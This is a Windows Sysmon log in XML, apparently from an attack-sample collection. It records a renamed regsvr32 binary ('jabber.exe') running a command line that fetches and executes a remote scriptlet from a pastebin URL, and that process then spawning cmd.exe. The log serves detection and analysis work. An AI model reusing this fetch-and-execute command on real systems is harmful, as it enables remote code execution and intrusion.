<root>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-12T18:48:52.219754800Z" />
      <EventRecordID>16839</EventRecordID>
      <Correlation />
      <Execution ProcessID="108" ThreadID="1268" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-12 18:48:52.219</Data>
      <Data Name="ProcessGuid">{365ABB72-6A94-5CD8-0000-00101BDB0E00}</Data>
      <Data Name="ProcessId">1340</Data>
      <Data Name="Image">C:\ProgramData\jabber.exe</Data>
      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
      <Data Name="Description">Microsoft(C) Register Server</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">jabber.exe  /u /s /i:http://pastebin.com/raw/H4A4iDTA .\jabber.dll</Data>
      <Data Name="CurrentDirectory">c:\ProgramData\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-695E-5CD8-0000-002015370100}</Data>
      <Data Name="LogonId">0x13715</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=A774A816662FF5B75669AA5BCE751BAB9D0972B8,MD5=432BE6CF7311062633459EEF6B242FB5,SHA256=890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B,IMPHASH=A2DAD36BD73280726DA578EB659D0583</Data>
      <Data Name="ParentProcessGuid">{365ABB72-6972-5CD8-0000-001000E70500}</Data>
      <Data Name="ParentProcessId">3484</Data>
      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
      <Data Name="ParentCommandLine">"C:\Windows\system32\cmd.exe" </Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-12T18:48:52.766629800Z" />
      <EventRecordID>16840</EventRecordID>
      <Correlation />
      <Execution ProcessID="108" ThreadID="1268" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-12 18:48:52.344</Data>
      <Data Name="ProcessGuid">{365ABB72-6A94-5CD8-0000-0010C2F10E00}</Data>
      <Data Name="ProcessId">3880</Data>
      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
      <Data Name="FileVersion">6.1.7601.17514 (win7sp1_rtm.101119-1850)</Data>
      <Data Name="Description">Windows Command Processor</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">"C:\Windows\System32\cmd.exe" </Data>
      <Data Name="CurrentDirectory">c:\ProgramData\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-695E-5CD8-0000-002015370100}</Data>
      <Data Name="LogonId">0x13715</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163</Data>
      <Data Name="ParentProcessGuid">{365ABB72-6A94-5CD8-0000-00101BDB0E00}</Data>
      <Data Name="ParentProcessId">1340</Data>
      <Data Name="ParentImage">C:\ProgramData\jabber.exe</Data>
      <Data Name="ParentCommandLine">jabber.exe  /u /s /i:http://pastebin.com/raw/H4A4iDTA .\jabber.dll</Data>
    </EventData>
  </Event>
</root>